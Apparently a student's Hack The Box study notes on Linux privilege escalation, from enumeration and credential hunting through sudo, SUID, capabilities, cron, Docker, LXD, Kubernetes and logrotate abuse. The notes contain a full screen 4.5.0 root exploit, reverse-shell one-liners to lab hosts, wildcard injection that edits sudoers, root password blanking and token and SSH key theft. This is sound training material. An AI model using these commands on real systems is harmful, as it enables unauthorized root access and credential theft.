# Information Gathering

#### Environment Enumeration
```shell-session
## Gaining Situation awareness
- Once we learn the basics and combine them with a new way of thinking and the stages of the Penetration Testing Process, it shouldn't matter what type of Linux system we land on because we'll have a thorough and repeatable process.

cat /etc/os-release

echo $PATH

env

uname -a

lscpu 

cat /etc/shells

- we can use the `lsblk` command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.)

lsblk

cat /etc/fstab

route

arp -a

cat /etc/passwd

cat /etc/passwd | cut -f1 -d:

grep "*sh$" /etc/passwd

cat /etc/group

getent group sudo

ls /home

df -h

cat /etc/fstab | grep -v "#" | column -t

find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

find / -type d -name ".*" -ls 2>/dev/null

ls -l /tmp /var/tmp /dev/shm

Addition imp:
- Tools like Linpeas and LinEnum can have help manual enumeration

// Skills
Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.
grep -rnw / -e 'HTB' 2>/dev/null
```

#### Linux Services & Internals Enumeration
```shell-session
## Internals 
- When we talk about the `internals`, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks. 
 
	-> So we start with the interfaces through which our target system can communicate.

ip a

cat /etc/hosts

lastlog

w

history

find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

ls -la /etc/cron.daily/

find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

## Services
- If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. 
 
	-> However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. 
	
	->Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.

apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

sudo -V

ls -l /bin /usr/bin/ /usr/sbin/

for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1,2,3,4 | sed '/^[[:space:]]*$/d'
strace ping -c1 10.129.112.20

find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

ps aux | grep root

find / -type f -name "html2text" 2>/dev/null

## Questions
What is the latest Python version that is installed on the target?

apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list 

grep python installed_pkgs.list 

IMP! Note for inner service examination:
netstat -tunlp


	-> Can use credentials obtained when attempting to perform PE for the usage of other service.  
```

#### Credential Hunting
```shell-session

## Overview
- When enumerating a system, it is important to note down any credentials.
 
	-> These may be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, a user's bash history file, backup (`.bak`) files, within database files or even in text files. 
	
	-> Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

- The /var directory typically contains the web root for whatever web server is running on the host. 
- 
	-> The web root may contain database credentials or other types of credentials that can be leveraged to further access.
	
	 -> A common example is MySQL database credentials within WordPress configuration files:
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null 

## SSH keys
- It is also useful to search around the system for accessible SSH private keys. 
 
	-> We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment.
	
	-> Whenever finding SSH keys check the `known_hosts` file to find targets. 
	
	-> This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.
	
ls ~/.ssh

## Questions
Find the WordPress database password.

find /var -type f -name "wp-config.php" 2>/dev/null
Or
grep -rnwl /var -e 'password' 2>/dev/null 

cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

read conf file?

cat conf
```

# Environment-based Privilege Escalation
#### Path Abuse
```shell-session
## Overview
- [PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located.
 
	-> An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. 
	
	-> For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`.
	
	 -> We can check the contents of the PATH variable by typing `env | 
	 grep PATH` or `echo $PATH`.

echo $PATH

pwd && conncheck 

PATH=.:${PATH}
export PATH
echo $PATH

touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls

ls

## Questions
echo $PATH
```

#### Wildcard Abuse
```shell-session
## Overview
- A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. 

	-> Examples of wild cards include:
```

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|


```
man tar

htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1

ls -la

sudo -l
```

#### Escaping Restricted Shells
```shell-session
## Overview
- A restricted shell is a type of shell that limits the user's ability to execute commands. 
 
	-> In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. 
	
	-> Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. 
	
	-> Some common examples of restricted shells include the `rbash` shell in Linux and the "Restricted-access Shell" in Windows.

## Escaping
- In some cases, it may be possible to escape from a restricted shell by injecting commands into the command line or other inputs the shell accepts.
 
	-> For example, suppose the shell allows users to execute commands by passing them as arguments to a built-in command. 
	
	-> In that case, it may be possible to escape from the shell by injecting additional commands into the argument.

ls -l `pwd` 

- Command substitution with backtick 
- Command chaining with (`;` or `|`)
- Environment variables
- shell functions

## Questions
- Enumerate commands that we can execute, ref https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/

echo /home/htb-user/*

while read line; do echo $line; done < /home/htb-user/flag.txt; echo $line
```

####  Special Permissions
```shell-session
## Overview
- The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.


find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

## GTFOBins
- The [GTFOBins](https://gtfobins.github.io) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. 
 
	-> Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. 
	
	-> For example, `apt-get` can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:
	
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

## Questions
Q1:Find a file with the setuid bit set that was not shown in the section command output (full path to the binary).
- Execute the find command on sid bits.

Q2:Find a file with the setgid bit set that was not shown in the section command output (full path to the binary).
- Execute the find command on guid bits
```

#### Sudo Rights Abuse
```shell-session
## Overview
- Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges.
 
	-> When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in **/etc/sudoers**. 
	
	-> When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. 
	
	-> Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

sudo -l

man tcpdump

cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

nc -lnvp 443

id && hostname 

## Questions
Run sudo -l and see /usr/bin/openssl is allowed to run as root.
```

#### Privileged Groups
```shell-session
## LXC / LXD

-> LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

id

unzip alpine.zip 

lxd init

lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

lxc init alpine r00t -c security.privileged=true

lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

## ADM
- Members of the adm group are able to read all logs stored in `/var/log`. 
 
	-> This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
	
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

## Questions
Use the privileged group rights of the secaudit user to locate a flag.
Looked into auth.log, lxd/lxd.log, sql/error.log, wtmp, syslog, dpkg.log, kern.log, faillog, fontconfig.log, lastlog, unattended-upgrades/logs, apt, alternatives.log

apache2log -> ch3ck_th0se_gr0uP_m3mb3erSh1Ps
-> log files from web services can reveal alot of info. 
```

#### Capabilities
```
## Overview
- Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. 
 
	-> This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.

- However, like any security feature, Linux capabilities are not invulnerable and can be exploited by attackers. 
 
	-> One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.

- Another potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need. 
 
	-> This can create unnecessary security risks, as we could exploit these privileges to gain access to sensitive information or perform unauthorized actions.

- Overall, Linux capabilities can be a practical security feature, but they must be used carefully and correctly to avoid vulnerabilities and potential exploits.

- Setting capabilities involves using the appropriate tools and commands to assign specific capabilities to executables or programs.
	
	-> In Ubuntu, for example, we can use the `setcap` command to set capabilities for specific executables. 
	
	-> This command allows us to specify the capability we want to set and the value we want to assign.

	-> For example, we could use the following command to set the `cap_net_bind_service` capability for an executable:

areaeric@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:
```

|**Capability Values**|**Description**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

|**Capability**|**Desciption**|
|---|---|
|`cap_setuid`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`cap_setgid`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`cap_sys_admin`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|
|`cap_dac_override`|Allows bypassing of file read, write, and execute permission checks.|


```
## Enumerating Capabilties
- It is important to note that these capabilities should be used with caution and only granted to trusted processes, as they can be misused to gain unauthorized access to the system. 
	 
	-> To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:

- Enumerating capabilities:

areaeric@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep

## Exploitation
- If we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability:

	-> Exploiting Capabilities

areaeric@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip

areaeric@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash

areaeric@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
or in non-interactie mode:

areaeric@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
areaeric@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash

## Questions
- Enumeration (ref to ##Enuemrating capabilities and ## exploitation)
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
-> vim.basic vulnerable

cat /etc/passwd | head -n1
-> looking for root user

/usr/bin/vim.basic /etc/passwd
-> change permission of root

cd /root
ls
cat flag.txt
```


## Service-based Privilege Escalation
#### Vulnerable Services
```shell-session
## overview
- Many services may be found, which have flaws that can be leveraged to escalate privileges. 
 
	-> An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). 
	
	-> Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

- Screen version identification
screen -v

- Privilege Escalation - Screen_Exploit.sh
./screen_exploit.sh 

#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell

## Questions
Q:Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory.
- Enumerate the screen version and rUn the exploit given in the section
```

#### Cron Job Abuse
```
## Overview
- Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. 
 
	-> The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. 
	
	-> Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. 
	
	-> For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

- The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a `.tar.gz` file every 12 hours).
 
	-> In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.

- Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

- First, let's look around the system for any writeable files or directories. 
 
	-> The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.

areaeric@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>

- A quick look in the `/dmz/backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. 
 
	-> Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. 
	
	-> The second issue is that the `backup.sh` shell script is world writeable and runs as root.

areaeric@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz


areaeric@htb[/htb]$ ./pspy64 -pf -i 1000

areaeric@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

- Adding reverse shell
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1

- Getting netcat 

areaeric@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02

## Questions
Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.
- Directly follow the section, btu changing the ip for the reverse shell (ref to ## overview)
```

#### LXD
```shell-session
## Overview
- Containers operate at the operating system level and virtual machines at the hardware level.
 
	-> Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

- Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. 
 
	-> For example, they facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. 
	
	-> Another example would be the isolation of processes that usually require root privileges.
	
	-> Such an application could be a web application or API that must be isolated from the host system to prevent escalation to databases.

## Linux Containers
- Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. 
 
	-> LXC is very popular due to its ease of use and has become an essential part of IT security.

- By default, `LXC` consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously.
 
	-> A platform with `LXC` can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer's system will work on any other system. 
	
	-> In addition, large applications can be started, stopped, or their environment variables changed via the Linux container interface.

- The ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques. 
 
	-> However, the enormous spread of `LXC`, an almost all-encompassing ecosystem, and innovative tools are primarily due to the Docker platform, which established Linux containers. 
	
	-> The entire setup, from creating container templates and deploying them, configuring the operating system and networking, to deploying applications, remains the same.

- Linux Daemon
container-user@nix02:~$ id

container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

// Questions
- Follow the methodology in the seciton above (ref to ##Linux Containers)
id

cd ContainerImages
ls

lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpinetemp
lxc image list

lxc init alpinetemp privesec -c security.privileged=true
lxc config device add privesec host-root disk source=/ path=/mnt/root recursive=true

lxc start privesec
lxc exec privesec /bin/sh
ls -l /mnt/root

find /mnt/root -type f -name "flag.txt" 2>/dev/null

cat /mnt/root/root/flag.txt

lxc exec privesec bash
```

#### Docker
```shell-session
## Overview
- Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. 
 
	-> It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.
	
	-> One advantage is that containerization thus consumes significantly fewer resources than a traditional server or virtual machine. 
	
	-> The core feature of Docker is that applications are encapsulated in so-called Docker containers. 
	
	-> They can thus be used for any operating system. A Docker container represents a lightweight standalone executable software package that contains everything needed to run an application code runtime.

## Docker Architecture
- At the core of the Docker architecture lies a client-server model, where we have two primary components:

	- The Docker daemon
	- The Docker client

- The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

## Docker Images and Containers
- Think of a `Docker image` as a blueprint or a template for creating containers.
- 
	-> It encapsulates everything needed to run an application, including the application's code, dependencies, libraries, and configurations.
	
	 -> An image is a self-contained, read-only package that ensures consistency and reproducibility across different environments.
	 
	-> We can create images using a text file called a `Dockerfile`, which defines the steps and instructions for building the image.

- A `Docker container` is an instance of a Docker image. 
 
	-> It is a lightweight, isolated, and executable environment that runs applications. When we launch a container, it is created from a specific image, and the container inherits all the properties and configurations defined in that image. 
	
	-> Each container operates independently, with its own filesystem, processes, and network interfaces. 
	
	-> This isolation ensures that applications within containers remain separate from the underlying host system and other containers, preventing conflicts and interference.

- While `images` are immutable and `read-only`, `containers` are mutable and `can be modified` during runtime. 

	-> We can interact with containers, execute commands within them, monitor their logs, and even make changes to their filesystem or environment. 
	
	-> However, any modifications made to a container's filesystem are not persisted unless explicitly saved as a new image or stored in a persistent volume.

## Docker Privilege Escalation
- What can happen is that we get access to an environment where we will find users who can manage docker containers. 
 
	-> With this, we could look for ways how to use those docker containers to obtain higher privileges on the target system. 
	
	-> We can use several ways and techniques to escalate our privileges or escape the docker container.

root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>

ssh cry0l1t3@<host IP> -i cry0l1t3.priv

htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>

htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>

htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>

docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

## Questions
Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.

- Two ways: Create container then go in look (ref to ## Docker Privilege Escalation and knowledge on docker in general)
docker run --name privesc ubuntu:latest

docker container rm af

// interactive mode
docker run -dit --name privesc ubuntu:latest
272a

docker container ls

docker exec -it privesc /bin/bash


-v /:/mnt

docker container stop 272
docker container rm 272

syntax thing: if unsuure can lookup, refer back to cloud computing notes 4/5 for syntax related thing. 
Here it's mount then image. 
docker run -it --name privesc -v /:/mnt ubuntu:latest 
->
root@bc946f58edaa:/mnt/root# cat flag.txt

The other way (communicate with socket)
	-> get docker 

docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

cat /root/flag.txt
```

#### Kubernetes
```shell-session
## Overview
- [Kubernetes](https://kubernetes.io/), also known as `K8s`, stands out as a revolutionary technology that has had a significant impact on the software development landscape. 
 
	-> This platform has completely transformed the process of deploying and managing applications, providing a more efficient and streamlined approach.
	
	-> Offering an open-source architecture, Kubernetes has been specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.

## K8s Concept
- Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers. 
 
	-> Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details.
	
	-> Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. 
	
	-> Despite challenges in security and management, K8s continues to grow and improve with features like `Role-Based Access Control` (`RBAC`), `Network Policies`, and `Security Contexts`, providing a safer environment for applications.

## Kubernetes API

- The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions. 
 
	-> The Kubernetes API has been designed to support declarative control, allowing users to define their desired state for the system. 
	
	-> This enables Kubernetes to take the necessary steps to implement the desired state. 
	
	-> The kube-apiserver is responsible for hosting the API, which handles and verifies RESTful requests for modifying the system's state. These requests can involve creating, modifying, deleting, and retrieving information related to various resources within the system. 
	
	-> Overall, the Kubernetes API plays a crucial role in facilitating seamless communication and control within the Kubernetes cluster.

curl https://10.129.10.11:6443 -k

curl https://10.129.10.11:10250/pods -k | jq .

kubeletctl -i --server 10.129.10.11 pods

kubeletctl -i --server 10.129.10.11 scan rce

kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

## Privilege Escalation
- To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. 
 
	-> To do this, we must provide the server's IP address, namespace, and target pod. 
	
	-> In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

- Kubelet API - Extracting Tokens
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

- Kubelet API - Extracting Certificates
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

export token=`cat k8.token`

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

pods YAML file:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

#### Logrotate
```shell-session
## Overview
- Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs.
- 
	-> If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. 
	
	-> Furthermore, searching through many large log files is time-consuming.
	
	 -> To prevent this and save disk space, `logrotate` has been developed.
	 
	-> The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions. 
	
	-> Almost more important are the unnoticed system details, such as whether all services are running correctly.

- `Logrotate` has many features for managing these log files. These include the specification of:

	- the `size` of the log file,
	- its `age`,
	- and the `action` to be taken when one of these factors is reached.
areaeric@htb[/htb]$ man logrotate
areaeric@htb[/htb]$ # or
areaeric@htb[/htb]$ logrotate --help

cat /etc/logrotate.conf

sudo cat /var/lib/logrotate.status

ls /etc/logrotate.d/

cat /etc/logrotate.d/dpkg

logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

grep "create\|compress" /etc/logrotate.conf | grep -

